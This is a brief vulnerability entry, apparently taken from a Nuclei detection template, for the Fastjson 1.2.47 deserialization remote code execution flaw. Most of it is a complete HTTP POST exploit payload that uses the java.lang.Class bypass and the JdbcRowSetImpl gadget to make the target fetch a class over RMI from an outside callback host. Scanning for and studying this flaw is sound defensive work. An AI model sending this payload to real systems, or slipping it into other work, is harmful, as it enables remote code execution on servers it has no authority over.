# Vulnerability: Fastjson 1.2.47 - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`fastjson-1-2-47-rce.yaml`)

## Description
Fastjson 1.2.47 is susceptible to a deserialization remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
        "autoCommit":true
    }
}
```

